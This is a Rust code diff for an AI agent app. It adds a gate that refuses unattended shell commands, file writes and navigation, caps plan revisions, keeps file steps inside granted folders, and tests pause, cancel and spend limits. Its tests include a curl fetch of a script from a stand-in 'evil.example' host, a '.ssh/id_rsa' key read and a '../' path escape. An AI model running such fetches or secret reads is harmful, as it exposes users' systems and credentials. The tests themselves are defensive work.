-        let steps: Vec<TaskStep> = serde_json::from_str(&checkpoint.steps_json)
-            .map_err(|e| anyhow!("Failed to deserialize checkpoint steps: {}", e))?;
+        failed_step: &str,
+        error: &str,
+        completed: &[String],
+        goal: &str,
+    ) -> Result<Vec<TaskStep>> {
+        self.replan_on_failure(failed_step, error, completed, goal)
+            .await
+    }
 
-        let task = Task {
-            id: checkpoint.task_id.clone(),
-            description: checkpoint.description.clone(),
-            status: TaskStatus::Pending,
-            created_at: std::time::Instant::now(),
-            updated_at: std::time::Instant::now(),
-            steps,
-            current_step: checkpoint.completed_step_index as usize,
-            max_retries: self.config.max_retries,
-            retry_count: checkpoint.retry_count as usize,
-            replan_count: checkpoint.replan_count as usize,
-            requires_approval: !checkpoint.auto_approve,
-            auto_approve: checkpoint.auto_approve,
+    async fn revise(
+        &self,
+        goal: &str,
+        outcomes: &[StepOutcome],
+        remaining: &[TaskStep],
+    ) -> Result<Option<Vec<TaskStep>>> {
+        self.consult_llm_after_step(goal, outcomes, remaining).await
+    }
+
+    async fn spend(&self) -> f64 {
+        self.router.read().await.get_cumulative_cost()
+    }
+}
+
+/// The chat tool whose approval policy answers for a planned action. Desktop
+/// input has none because the executor refuses it outright. The match is
+/// exhaustive so a new action cannot reach an unattended run unjudged.
+fn approval_tool_for(action: &Action) -> Option<&'static str> {
+    match action {
+        Action::Screenshot { .. } | Action::WaitForElement { .. } | Action::SearchText { .. } => {
+            Some("ui_screenshot")
+        }
+        Action::Navigate { .. } => Some("browser_navigate"),
+        Action::ExecuteCommand { .. } => Some("terminal_execute"),
+        Action::ReadFile { .. } => Some("file_read"),
+        Action::WriteFile { .. } => Some("file_write"),
+        Action::Click { .. }
+        | Action::Type { .. }
+        | Action::Scroll { .. }
+        | Action::PressKey { .. } => None,
+    }
+}
+
+/// Why a task may not take this action, if it may not. A task runs with
+/// nobody watching and no plan is ever approved for it, so each action meets
+/// the unattended tool policy on its own.
+fn unattended_refusal<R: tauri::Runtime>(
+    app_handle: Option<&tauri::AppHandle<R>>,
+    action: &Action,
+) -> Option<String> {
+    let tool_name = approval_tool_for(action)?;
+    let Some(app_handle) = app_handle else {
+        return Some(format!(
+            "{UNATTENDED_DENIAL_PREFIX} '{tool_name}' was refused because the approval service is unavailable."
+        ));
+    };
+    unattended_tool_approval(app_handle, tool_name)
+        .err()
+        .map(|refusal| refusal.to_string())
+}
+
+/// A file path still relative after [`RunHost::in_project`] has no project
+/// folder to stand in, so nothing can say which file it names.
+fn relative_path_refusal(action: &Action) -> Option<String> {
+    let path = match action {
+        Action::ReadFile { path } | Action::WriteFile { path, .. } => path,
+        _ => return None,
+    };
+    Path::new(path)
+        .is_relative()
+        .then(|| format!("Give the full path: '{path}' is relative and no project folder is open."))
+}
+
+fn file_step_refusal_in(granted: &GrantedFolders, action: &Action) -> Option<String> {
+    let checked = match action {
+        Action::ReadFile { path } => granted.readable_path(Path::new(path), "file_read"),
+        Action::WriteFile { path, .. } => granted.writable_new_path(Path::new(path), "file_write"),
+        _ => return None,
+    };
+    checked.err().map(|refusal| refusal.to_string())
+}
+
+/// Why the model's rewrite of the remaining steps is not adopted, if it is
+/// not. A revision is judged whole, by the rule the first plan met, before
+/// any of it can run: it cannot add a step the run could not have started
+/// with, and it cannot be the one past [`MAX_PLAN_REVISIONS`].
+fn revision_refusal<R: tauri::Runtime>(
+    app_handle: Option<&tauri::AppHandle<R>>,
+    revisions_so_far: usize,
+    revised: &[TaskStep],
+) -> Option<String> {
+    if revisions_so_far >= MAX_PLAN_REVISIONS {
+        return Some(format!(
+            "the plan was already revised {MAX_PLAN_REVISIONS} times"
+        ));
+    }
+    let refusals = unattended_plan_refusals(app_handle, revised);
+    (!refusals.is_empty()).then(|| refusals.join("\n"))
+}
+
+/// The one line a person reading the run sees when a plan change is dropped.
+fn revision_not_adopted(why: &str) -> String {
+    format!(
+        "The plan change the model asked for was not adopted: {}",
+        why.replace('\n', " ")
+    )
+}
+
+fn unattended_plan_refusals<R: tauri::Runtime>(
+    app_handle: Option<&tauri::AppHandle<R>>,
+    steps: &[TaskStep],
+) -> Vec<String> {
+    let mut refusals: Vec<String> = Vec::new();
+    for step in steps {
+        if let Some(refusal) = unattended_refusal(app_handle, &step.action) {
+            if !refusals.contains(&refusal) {
+                refusals.push(refusal);
+            }
+        }
+    }
+    refusals
+}
+
+#[cfg(test)]
+mod unattended_gate {
+    use super::*;
+    use crate::sys::commands::tool_confirmation::{AgentMode, ToolConfirmationState};
+    use tauri::Manager;
+
+    fn managed_app(mode: AgentMode) -> tauri::App<tauri::test::MockRuntime> {
+        let app = tauri::test::mock_app();
+        let state = ToolConfirmationState::new();
+        state.set_agent_mode(mode);
+        app.handle().manage(state);
+        app
+    }
+
+    fn remember(app: &tauri::App<tauri::test::MockRuntime>, tool_name: &str) {
+        app.handle()
+            .state::<ToolConfirmationState>()
+            .remember_choice(tool_name, true);
+    }
+
+    fn navigate() -> Action {
+        Action::Navigate {
+            url: "https://example.com".to_string(),
+        }
+    }
+
+    fn write_file() -> Action {
+        Action::WriteFile {
+            path: "notes.txt".to_string(),
+            content: "done".to_string(),
+        }
+    }
+
+    fn read_file() -> Action {
+        Action::ReadFile {
+            path: "notes.txt".to_string(),
+        }
+    }
+
+    fn run_command() -> Action {
+        Action::ExecuteCommand {
+            command: "curl".to_string(),
+            args: vec!["https://evil.example/x.sh".to_string()],
+        }
+    }
+
+    fn step(action: Action) -> TaskStep {
+        TaskStep {
+            id: "step-1".to_string(),
+            action,
+            description: "planned by the model".to_string(),
+            expected_result: None,
+            timeout: Duration::from_secs(30),
+            retry_on_failure: false,
+        }
+    }
+
+    #[test]
+    fn each_action_answers_to_the_chat_tool_that_does_the_same_thing() {
+        assert_eq!(approval_tool_for(&navigate()), Some("browser_navigate"));
+        assert_eq!(approval_tool_for(&write_file()), Some("file_write"));
+        assert_eq!(approval_tool_for(&read_file()), Some("file_read"));
+        assert_eq!(approval_tool_for(&run_command()), Some("terminal_execute"));
+        assert_eq!(
+            approval_tool_for(&Action::Screenshot { region: None }),
+            Some("ui_screenshot")
+        );
+        assert_eq!(
+            approval_tool_for(&Action::PressKey {
+                keys: vec!["Enter".to_string()]
+            }),
+            None
+        );
+    }
+
+    #[test]
+    fn a_background_run_is_refused_an_action_that_would_prompt_and_told_which() {
+        let app = managed_app(AgentMode::Build);
+
+        for (action, tool_name) in [
+            (navigate(), "'browser_navigate'"),
+            (write_file(), "'file_write'"),
+            (run_command(), "'terminal_execute'"),
+        ] {
+            let refusal = unattended_refusal(Some(app.handle()), &action)
+                .expect("nobody is there to approve it");
+
+            assert!(refusal.starts_with(UNATTENDED_DENIAL_PREFIX), "{refusal}");
+            assert!(refusal.contains(tool_name), "{refusal}");
+        }
+    }
+
+    #[test]
+    fn a_background_run_reads_and_looks_without_asking() {
+        let app = managed_app(AgentMode::Build);
+
+        assert_eq!(unattended_refusal(Some(app.handle()), &read_file()), None);
+        assert_eq!(
+            unattended_refusal(Some(app.handle()), &Action::Screenshot { region: None }),
+            None
+        );
+    }
+
+    #[test]
+    fn a_stored_always_allow_lets_the_action_through() {
+        let app = managed_app(AgentMode::Build);
+        remember(&app, "browser_navigate");
+
+        assert_eq!(unattended_refusal(Some(app.handle()), &navigate()), None);
+    }
+
+    #[test]
+    fn auto_approve_all_and_session_approvals_do_not_stand_in() {
+        let app = managed_app(AgentMode::Autopilot);
+        let state = app.handle().state::<ToolConfirmationState>();
+        state.set_auto_approve_all(true);
+        state.approve_for_session("browser_navigate");
+        state.approve_for_session("file_write");
+
+        assert!(unattended_refusal(Some(app.handle()), &navigate()).is_some());
+        assert!(unattended_refusal(Some(app.handle()), &write_file()).is_some());
+    }
+
+    #[test]
+    fn a_shell_command_or_file_write_is_refused_even_after_always_allow() {
+        let app = managed_app(AgentMode::Build);
+        remember(&app, "terminal_execute");
+        remember(&app, "file_write");
+
+        for (action, tool_name) in [
+            (run_command(), "'terminal_execute'"),
+            (write_file(), "'file_write'"),
+        ] {
+            let refusal = unattended_refusal(Some(app.handle()), &action)
+                .expect("these are only as safe as this run's argument");
+
+            assert!(refusal.contains(tool_name), "{refusal}");
+            assert!(!refusal.contains("Always allow"), "{refusal}");
+        }
+    }
+
+    #[test]
+    fn a_run_with_no_approval_service_is_refused_every_judged_action() {
+        let refusal = unattended_refusal::<tauri::test::MockRuntime>(None, &read_file())
+            .expect("no approval service means no approval");
+
+        assert!(refusal.starts_with(UNATTENDED_DENIAL_PREFIX), "{refusal}");
+        assert!(refusal.contains("'file_read'"), "{refusal}");
+    }
+
+    #[test]
+    fn desktop_input_is_left_to_the_executor_refusal() {
+        let app = managed_app(AgentMode::Build);
+
+        assert_eq!(
+            unattended_refusal(
+                Some(app.handle()),
+                &Action::PressKey {
+                    keys: vec!["Enter".to_string()]
+                }
+            ),
+            None
+        );
+    }
+
+    #[test]
+    fn a_plan_is_judged_whole_and_names_each_refused_tool_once() {
+        let app = managed_app(AgentMode::Build);
+        let steps = [
+            step(read_file()),
+            step(navigate()),
+            step(navigate()),
+            step(write_file()),
+        ];
+
+        let refusals = unattended_plan_refusals(Some(app.handle()), &steps);
+
+        assert_eq!(refusals.len(), 2, "{refusals:?}");
+        assert!(refusals[0].contains("'browser_navigate'"), "{refusals:?}");
+        assert!(refusals[1].contains("'file_write'"), "{refusals:?}");
+    }
+
+    #[test]
+    fn a_read_only_revision_is_adopted() {
+        let app = managed_app(AgentMode::Build);
+        let revised = [
+            step(read_file()),
+            step(Action::Screenshot { region: None }),
+            step(Action::SearchText {
+                query: "total".to_string(),
+            }),
+        ];
+
+        assert_eq!(revision_refusal(Some(app.handle()), 0, &revised), None);
+    }
+
+    #[test]
+    fn a_revision_that_adds_a_command_a_write_or_a_navigation_is_not_adopted() {
+        let app = managed_app(AgentMode::Build);
+
+        for (added, tool_name) in [
+            (run_command(), "'terminal_execute'"),
+            (write_file(), "'file_write'"),
+            (navigate(), "'browser_navigate'"),
+        ] {
+            let refused =
+                revision_refusal(Some(app.handle()), 0, &[step(read_file()), step(added)])
+                    .expect("a revision cannot add what the first plan could not hold");
+
+            assert!(refused.starts_with(UNATTENDED_DENIAL_PREFIX), "{refused}");
+            assert!(refused.contains(tool_name), "{refused}");
+        }
+    }
+
+    #[test]
+    fn a_revision_gets_no_more_than_the_users_stored_allow() {
+        let app = managed_app(AgentMode::Autopilot);
+        let state = app.handle().state::<ToolConfirmationState>();
+        state.set_auto_approve_all(true);
+        state.approve_for_session("file_write");
+        remember(&app, "browser_navigate");
+
+        assert_eq!(
+            revision_refusal(Some(app.handle()), 0, &[step(navigate())]),
+            None
+        );
+        assert!(revision_refusal(Some(app.handle()), 0, &[step(write_file())]).is_some());
+        assert!(revision_refusal(Some(app.handle()), 0, &[step(run_command())]).is_some());
+    }
+
+    #[test]
+    fn the_plan_is_frozen_once_it_has_been_revised_the_capped_number_of_times() {
+        let app = managed_app(AgentMode::Build);
+        let revised = [step(read_file())];
+
+        assert_eq!(
+            revision_refusal(Some(app.handle()), MAX_PLAN_REVISIONS - 1, &revised),
+            None
+        );
+        let refused = revision_refusal(Some(app.handle()), MAX_PLAN_REVISIONS, &revised)
+            .expect("even a read-only revision is refused past the cap");
+        assert!(refused.contains("already revised"), "{refused}");
+    }
+
+    async fn granted(folder: &Path) -> GrantedFolders {
+        granted_folders_for(None, &[folder.to_path_buf()])
+            .await
+            .expect("a real folder can be granted")
+    }
+
+    fn read_of(path: &Path) -> Action {
+        Action::ReadFile {
+            path: path.to_string_lossy().into_owned(),
+        }
+    }
+
+    fn write_of(path: &Path) -> Action {
+        Action::WriteFile {
+            path: path.to_string_lossy().into_owned(),
+            content: "done".to_string(),
+        }
+    }
+
+    #[tokio::test]
+    async fn a_file_step_stays_inside_the_folders_the_user_granted() {
+        let project = tempfile::TempDir::new().unwrap();
+        let elsewhere = tempfile::TempDir::new().unwrap();
+        std::fs::write(project.path().join("notes.txt"), "in").unwrap();
+        std::fs::write(elsewhere.path().join("zshrc"), "out").unwrap();
+        let granted = granted(project.path()).await;
+
+        assert_eq!(
+            file_step_refusal_in(&granted, &read_of(&project.path().join("notes.txt"))),
+            None
+        );
+        assert_eq!(
+            file_step_refusal_in(&granted, &write_of(&project.path().join("new.txt"))),
+            None
+        );
+        for outside in [
+            read_of(&elsewhere.path().join("zshrc")),
+            write_of(&elsewhere.path().join("zshrc")),
+            write_of(&elsewhere.path().join("new.txt")),
+        ] {
+            let refusal = file_step_refusal_in(&granted, &outside)
+                .expect("the user granted the project folder and nothing else");
+            assert!(refusal.contains("outside allowed directories"), "{refusal}");
+        }
+        assert_eq!(file_step_refusal_in(&granted, &navigate()), None);
+    }
+
+    #[tokio::test]
+    async fn a_relative_path_is_read_inside_the_project_and_cannot_climb_out_of_it() {
+        let root = tempfile::TempDir::new().unwrap();
+        let project = root.path().join("project");
+        let outside = root.path().join("outside");
+        std::fs::create_dir(&project).unwrap();
+        std::fs::create_dir(&outside).unwrap();
+        std::fs::write(project.join("notes.txt"), "in").unwrap();
+        std::fs::write(outside.join("zshrc"), "out").unwrap();
+        let granted = granted(&project).await;
+        let relative = |path: &str| Action::ReadFile {
+            path: path.to_string(),
         };
 
-        let task_id = task.id.clone();
+        let inside = executor::step_in_folder(&relative("notes.txt"), Some(project.as_path()));
+        assert!(
+            matches!(&inside, Action::ReadFile { path } if Path::new(path).is_absolute()),
+            "{inside:?}"
+        );
+        assert_eq!(relative_path_refusal(&inside), None);
+        assert_eq!(file_step_refusal_in(&granted, &inside), None);
 
-        {
-            let mut queue = self.task_queue.lock();
+        let climbed =
+            executor::step_in_folder(&relative("../outside/zshrc"), Some(project.as_path()));
+        assert_eq!(relative_path_refusal(&climbed), None);
+        let refusal = file_step_refusal_in(&granted, &climbed)
+            .expect("a path that leaves the project is outside what was granted");
+        assert!(refusal.contains("outside allowed directories"), "{refusal}");
 
-            // ISSUE-05 fix: Reject duplicate task IDs on resume to prevent
-            // the same checkpoint from being enqueued multiple times.
-            if queue.iter().any(|t| t.id == task_id) {
-                return Err(anyhow!(
-                    "Task {} already exists in the queue, refusing duplicate resume",
-                    task_id
-                ));
-            }
+        let new_file = executor::step_in_folder(
+            &Action::WriteFile {
+                path: "../outside/new.txt".to_string(),
+                content: "x".to_string(),
+            },
+            Some(project.as_path()),
+        );
+        assert!(file_step_refusal_in(&granted, &new_file).is_some());
+    }
 
-            let pending_count = queue
-                .iter()
-                .filter(|t| matches!(t.status, TaskStatus::Pending | TaskStatus::WaitingApproval))
-                .count();
-            if pending_count >= MAX_PENDING_TASKS {
-                return Err(anyhow!(
-                    "Task queue full ({} pending tasks)",
-                    MAX_PENDING_TASKS
-                ));
-            }
-            queue.push(task);
+    #[test]
+    fn a_relative_path_with_no_project_open_is_refused_by_name() {
+        let unresolved = executor::step_in_folder(&read_file(), None);
+
+        let refusal = relative_path_refusal(&unresolved).expect("no folder to read it against");
+
+        assert!(refusal.starts_with("Give the full path"), "{refusal}");
+        assert!(refusal.contains("'notes.txt'"), "{refusal}");
+        assert_eq!(relative_path_refusal(&navigate()), None);
+    }
+
+    #[tokio::test]
+    async fn a_secrets_path_is_refused_inside_a_granted_folder_too() {
+        let project = tempfile::TempDir::new().unwrap();
+        std::fs::create_dir(project.path().join(".ssh")).unwrap();
+        std::fs::write(project.path().join(".ssh").join("id_rsa"), "key").unwrap();
+        let granted = granted(project.path()).await;
+
+        let refusal = file_step_refusal_in(&granted, &read_of(&project.path().join(".ssh/id_rsa")))
+            .expect("a key file is never read by an agent step");
+
+        assert!(refusal.contains("protected secrets path"), "{refusal}");
+    }
+
+    #[test]
+    fn a_dropped_plan_change_is_reported_in_one_line_with_its_reason() {
+        let app = managed_app(AgentMode::Build);
+        let refused = revision_refusal(
+            Some(app.handle()),
+            0,
+            &[step(navigate()), step(run_command())],
+        )
+        .expect("two refused steps");
+
+        let note = revision_not_adopted(&refused);
+
+        assert!(note.starts_with("The plan change the model asked for was not adopted: "));
+        assert!(!note.contains('\n'), "{note}");
+        assert!(note.contains("'browser_navigate'"), "{note}");
+        assert!(note.contains("'terminal_execute'"), "{note}");
+    }
+
+    #[test]
+    fn a_plan_of_reads_has_nothing_to_refuse() {
+        let app = managed_app(AgentMode::Build);
+
+        assert!(unattended_plan_refusals(Some(app.handle()), &[step(read_file())]).is_empty());
+    }
+}
+
+#[cfg(test)]
+mod run_loop {
+    use super::*;
+    use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+    use tokio::sync::Semaphore;
+
+    /// A host with no model and no desktop. Each step waits for a permit, so
+    /// a test decides exactly how far the run gets.
+    struct FakeHost {
+        started: parking_lot::Mutex<Vec<String>>,
+        finished: AtomicUsize,
+        gate: Semaphore,
+        app_total_spend: f64,
+        cost_per_step: f64,
+    }
+
+    impl FakeHost {
+        fn new(permits: usize) -> Arc<Self> {
+            Arc::new(Self {
+                started: parking_lot::Mutex::new(Vec::new()),
+                finished: AtomicUsize::new(0),
+                gate: Semaphore::new(permits),
+                app_total_spend: 0.0,
+                cost_per_step: 0.0,
+            })
         }
 
-        tracing::info!(
-            "[Agent] Resumed task {} from checkpoint at step {}/{}",
-            task_id,
-            checkpoint.completed_step_index,
-            checkpoint.total_steps
-        );
+        fn started(&self) -> Vec<String> {
+            self.started.lock().clone()
+        }
 
-        Ok(task_id)
+        fn let_steps_finish(&self, steps: usize) {
+            self.gate.add_permits(steps);
+        }
     }
 
-    pub fn get_task_status(&self, task_id: &str) -> Result<Option<Task>> {
-        let queue = self.task_queue.lock();
-        Ok(queue.iter().find(|t| t.id == task_id).cloned())
+    #[async_trait]
+    impl RunHost for FakeHost {
+        fn emit(&self, _event: &str, _payload: serde_json::Value) {}
+
+        async fn in_project(&self, step: TaskStep) -> TaskStep {
+            step
+        }
+
+        async fn refusal(&self, _action: &Action) -> Option<String> {
+            None
+        }
+
+        fn revision_refusal(&self, _revisions: usize, _revised: &[TaskStep]) -> Option<String> {
+            None
+        }
+
+        async fn run_step(&self, step: &TaskStep) -> Result<StepResult> {
+            self.started.lock().push(step.id.clone());
+            self.gate.acquire().await.expect("gate").forget();
+            self.finished.fetch_add(1, Ordering::SeqCst);
+            Ok(StepResult {
+                step_id: step.id.clone(),
+                success: true,
+                result: Some(format!("{} done", step.id)),
+                error: None,
+                screenshot_path: None,
+                duration: Duration::from_millis(1),
+            })
+        }
+
+        async fn replan(
+            &self,
+            _failed_step: &str,
+            _error: &str,
+            _completed: &[String],
+            _goal: &str,
+        ) -> Result<Vec<TaskStep>> {
+            Err(anyhow!("no model in this test"))
+        }
+
+        async fn revise(
+            &self,
+            _goal: &str,
+            _outcomes: &[StepOutcome],
+            _remaining: &[TaskStep],
+        ) -> Result<Option<Vec<TaskStep>>> {
+            Ok(None)
+        }
+
+        async fn spend(&self) -> f64 {
+            self.app_total_spend + self.cost_per_step * self.finished.load(Ordering::SeqCst) as f64
+        }
     }
 
-    pub fn list_tasks(&self) -> Result<Vec<Task>> {
-        let queue = self.task_queue.lock();
-        Ok(queue.clone())
+    fn plan(steps: usize) -> Task {
+        Task {
+            id: "task-1".to_string(),
+            description: "Sync the inbox".to_string(),
+            status: TaskStatus::Executing,
+            created_at: std::time::Instant::now(),
+            updated_at: std::time::Instant::now(),
+            steps: (1..=steps)
+                .map(|number| TaskStep {
+                    id: format!("s{number}"),
+                    action: Action::Screenshot { region: None },
+                    description: format!("step {number}"),
+                    expected_result: None,
+                    timeout: Duration::from_secs(5),
+                    retry_on_failure: false,
+                })
+                .collect(),
+            current_step: 0,
+            max_retries: 3,
+            retry_count: 0,
+            replan_count: 0,
+        }
     }
-}
 
-/// Build an `ApprovalRequestPayload` from a `Task` for escalation to `ApprovalController`.
-///
-/// Maps the task's step actions to an appropriate scope type and risk level so the
-/// frontend can display a meaningful approval prompt.
-pub(crate) fn build_approval_payload(task: &Task) -> ApprovalRequestPayload {
-    let scope_type = task
-        .steps
-        .iter()
-        .find_map(|step| match &step.action {
-            Action::ExecuteCommand { .. } => Some(ApprovalScopeType::Terminal),
-            Action::WriteFile { .. } | Action::ReadFile { .. } => {
-                Some(ApprovalScopeType::Filesystem)
-            }
-            Action::Navigate { .. } => Some(ApprovalScopeType::Browser),
-            Action::Click { .. } | Action::Type { .. } | Action::PressKey { .. } => {
-                Some(ApprovalScopeType::Ui)
-            }
-            _ => None,
+    fn limits() -> RunLimits {
+        RunLimits {
+            max_step_runs: DEFAULT_MAX_STEP_RUNS,
+            spend_cap: 5.0,
+            spend_at_start: 0.0,
+        }
+    }
+
+    fn start(
+        host: &Arc<FakeHost>,
+        steps: usize,
+        control: &RunControl,
+        limits: RunLimits,
+    ) -> tokio::task::JoinHandle<(Drive, RunState)> {
+        let (host, control) = (Arc::clone(host), control.clone());
+        tokio::spawn(async move {
+            let mut task = plan(steps);
+            let mut state = RunState::default();
+            let end = drive(&*host, &mut task, &mut state, &control, &limits).await;
+            (end, state)
         })
-        .unwrap_or(ApprovalScopeType::Unknown);
-
-    let risk_level = if task.steps.iter().any(|s| {
-        matches!(
-            s.action,
-            Action::ExecuteCommand { .. } | Action::WriteFile { .. }
-        )
-    }) {
-        "high"
-    } else if task
-        .steps
-        .iter()
-        .any(|s| matches!(s.action, Action::Navigate { .. }))
-    {
-        "medium"
-    } else {
-        "low"
-    };
-
-    let step_descriptions: Vec<String> = task.steps.iter().map(|s| s.description.clone()).collect();
-
-    ApprovalRequestPayload {
-        action_id: task.id.clone(),
-        tool_name: "autonomous_task".to_string(),
-        title: format!("Autonomous task: {}", truncate_str(&task.description, 80)),
-        description: task.description.clone(),
-        reason: format!(
-            "Task requires approval ({} steps: {})",
-            task.steps.len(),
-            truncate_str(&step_descriptions.join(", "), 120)
-        ),
-        risk_level: risk_level.to_string(),
-        scope: ApprovalScope {
-            scope_type,
-            command: None,
-            cwd: None,
-            path: None,
-            domain: None,
-            description: Some(task.description.clone()),
-            risk: risk_level.to_string(),
-        },
-        workflow_hash: None,
-        action_signature: format!("task:{}", task.id),
     }
-}
 
-/// Truncate a string to `max_len` characters, appending "..." if truncated.
-pub(crate) fn truncate_str(s: &str, max_len: usize) -> String {
-    if s.len() <= max_len {
-        s.to_string()
-    } else {
-        let truncated: String = s.chars().take(max_len.saturating_sub(3)).collect();
-        format!("{}...", truncated)
+    async fn until(what: &str, mut reached: impl FnMut() -> bool) {
+        let deadline = std::time::Instant::now() + Duration::from_secs(5);
+        while !reached() {
+            assert!(
+                std::time::Instant::now() < deadline,
+                "never happened: {what}"
+            );
+            sleep(Duration::from_millis(5)).await;
+        }
+    }
+
+    #[tokio::test]
+    async fn cancel_mid_run_stops_the_step_in_flight_and_every_step_after_it() {
+        let host = FakeHost::new(1);
+        let control = RunControl::new();
+        let run = start(&host, 5, &control, limits());
+        until("the second step starts", || host.started().len() == 2).await;
+
+        control.stop(StopReason::Cancelled);
+        let (end, state) = run.await.expect("the run ends");
+
+        assert_eq!(end, Drive::Stopped(StopReason::Cancelled));
+        assert_eq!(
+            state.step_index, 1,
+            "the dropped step is not counted as done"
+        );
+        host.let_steps_finish(10);
+        sleep(Duration::from_millis(200)).await;
+        assert_eq!(host.started(), vec!["s1", "s2"]);
+        assert_eq!(host.finished.load(Ordering::SeqCst), 1);
+    }
+
+    #[tokio::test]
+    async fn the_time_limit_stops_the_run_itself() {
+        let host = FakeHost::new(1);
+        let control = RunControl::new();
+        let run = start(&host, 5, &control, limits());
+        until("the second step starts", || host.started().len() == 2).await;
+
+        control.stop(StopReason::TimeLimit);
+        control.stop(StopReason::Cancelled);
+        let (end, _) = run.await.expect("the run ends");
+
+        assert_eq!(
+            end,
+            Drive::Stopped(StopReason::TimeLimit),
+            "the first reason is the one the run ends with"
+        );
+        host.let_steps_finish(10);
+        sleep(Duration::from_millis(200)).await;
+        assert_eq!(host.started().len(), 2, "a step ran after the limit");
+    }
+
+    #[tokio::test]
+    async fn pause_holds_at_the_next_step_and_resume_runs_each_step_once() {
+        let host = FakeHost::new(1);
+        let control = RunControl::new();
+        let run = start(&host, 4, &control, limits());
+        until("the second step starts", || host.started().len() == 2).await;
+
+        control.pause();
+        host.let_steps_finish(10);
+        until("the step in flight finishes", || {
+            host.finished.load(Ordering::SeqCst) == 2
+        })
+        .await;
+        sleep(Duration::from_millis(300)).await;
+        assert_eq!(
+            host.started(),
+            vec!["s1", "s2"],
+            "a step started while the run was paused"
+        );
+        assert!(control.is_paused());
+
+        control.resume();
+        let (end, state) = run.await.expect("the run ends");
+
+        assert_eq!(end, Drive::Done);
+        assert_eq!(host.started(), vec!["s1", "s2", "s3", "s4"]);
+        assert_eq!(state.step_runs, 4);
+        assert_eq!(state.outcomes.len(), 4);
+    }
+
+    #[tokio::test]
+    async fn a_paused_run_can_still_be_stopped() {
+        let host = FakeHost::new(10);
+        let control = RunControl::new();
+        control.pause();
+        let run = start(&host, 3, &control, limits());
+        sleep(Duration::from_millis(100)).await;
+        assert!(host.started().is_empty());
+
+        control.stop(StopReason::AppClosing);
+        let (end, _) = run.await.expect("the run ends");
+
+        assert_eq!(end, Drive::Stopped(StopReason::AppClosing));
+        assert!(host.started().is_empty());
+    }
+
+    #[tokio::test]
+    async fn the_step_limit_counts_steps_that_ran_and_not_time_spent_waiting() {
+        let host = FakeHost::new(10);
+        let control = RunControl::new();
+        control.pause();
+        let run = start(
+            &host,
+            5,
+            &control,
+            RunLimits {
+                max_step_runs: 2,
+                ..limits()
+            },
+        );
+        sleep(Duration::from_millis(300)).await;
+        control.resume();
+        let (end, state) = run.await.expect("the run ends");
+
+        assert_eq!(
+            end,
+            Drive::Failed("The agent stopped at its step limit (2 step runs).".to_string())
+        );
+        assert_eq!(state.step_runs, 2);
+        assert_eq!(host.started(), vec!["s1", "s2"]);
+    }
+
+    #[tokio::test]
+    async fn a_run_is_charged_only_for_what_it_spent_itself() {
+        let host = Arc::new(FakeHost {
+            started: parking_lot::Mutex::new(Vec::new()),
+            finished: AtomicUsize::new(0),
+            gate: Semaphore::new(10),
+            app_total_spend: 400.0,
+            cost_per_step: 0.5,
+        });
+        let control = RunControl::new();
+        let run = start(
+            &host,
+            6,
+            &control,
+            RunLimits {
+                spend_cap: 1.2,
+                spend_at_start: 400.0,
+                ..limits()
+            },
+        );
+        let (end, _) = run.await.expect("the run ends");
+
+        assert_eq!(
+            end,
+            Drive::Failed(
+                "The agent stopped at its spending limit: it had spent $1.50 of $1.20.".to_string()
+            ),
+            "spend by the rest of the app before the run began is not the run's"
+        );
+        assert_eq!(host.started().len(), 3);
+    }
+
+    #[tokio::test]
+    async fn a_stop_drops_the_work_in_flight() {
+        let control = RunControl::new();
+        let finished = Arc::new(AtomicBool::new(false));
+        let work = {
+            let finished = Arc::clone(&finished);
+            async move {
+                sleep(Duration::from_millis(200)).await;
+                finished.store(true, Ordering::SeqCst);
+            }
+        };
+        let stopper = control.clone();
+        tokio::spawn(async move {
+            sleep(Duration::from_millis(20)).await;
+            stopper.stop(StopReason::Cancelled);
+        });
+
+        assert_eq!(
+            control.unless_stopped(work).await,
+            Err(Stopped(StopReason::Cancelled))
+        );
+        sleep(Duration::from_millis(400)).await;
+        assert!(!finished.load(Ordering::SeqCst));
+        assert_eq!(
+            control.checkpoint().await,
+            Err(Stopped(StopReason::Cancelled))
+        );
+    }
+
+    #[test]
+    fn a_run_that_could_not_be_planned_says_what_was_asked_and_what_to_do() {
+        let local = planning_failure(TrustMode::Local, "no local model provider is reachable");
+        assert!(
+            local.starts_with("The run could not be planned."),
+            "{local}"
+        );
+        assert!(local.contains("a model on this computer"), "{local}");
+        assert!(
+            local.contains("no local model provider is reachable"),
+            "{local}"
+        );
+        assert!(local.contains("Start your local model runtime"), "{local}");
+        assert!(local.contains("never sent to a cloud model"), "{local}");
+
+        let cloud = planning_failure(TrustMode::ManagedCloud, "401");
+        assert!(cloud.contains("AGI Cloud"), "{cloud}");
+        assert!(cloud.contains("signed in"), "{cloud}");
+        assert!(!cloud.contains("local model runtime"), "{cloud}");
+    }
+
+    #[test]
+    fn the_report_carries_each_step_output_bounded() {
+        let long = "x".repeat(STEP_OUTPUT_CHARS + 50);
+        let bounded = bounded_output(&long);
+        assert_eq!(bounded.chars().count(), STEP_OUTPUT_CHARS + 3);
+        assert_eq!(bounded_output("3 unread"), "3 unread");
+
+        let outcomes: Vec<StepOutcome> = (1..=REPORTED_STEPS + 5)
+            .map(|number| StepOutcome {
+                step_id: format!("s{number}"),
+                description: format!("step {number}"),
+                result: format!("result {number}"),
+            })
+            .collect();
+        let steps = reported_steps(&outcomes);
+        assert_eq!(steps.len(), REPORTED_STEPS);
+        assert_eq!(steps.last().map(String::as_str), Some("step 55: result 55"));
+        assert_eq!(fallback_summary(&outcomes), "step 55: result 55");
+        assert_eq!(fallback_summary(&[]), "");
     }
 }
